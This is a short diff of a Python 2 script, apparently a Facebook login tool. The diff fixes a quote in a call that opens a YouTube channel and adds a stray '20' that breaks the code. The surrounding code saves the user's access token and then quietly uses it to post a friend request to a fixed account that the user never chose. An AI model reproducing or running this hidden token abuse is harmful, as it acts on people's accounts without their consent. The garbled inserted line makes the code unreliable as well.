@@ -14,7 +14,7 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-
+20
 
 def keluar():
 	print "\033[1;96m[!] \x1b[1;91mExit"
@@ -142,7 +142,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCjfG5jfIgoJpKUz8Ku3gwFA)
+				os.system('xdg-open https://www.youtube.com/channel/UCjfG5jfIgoJpKUz8Ku3gwFA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
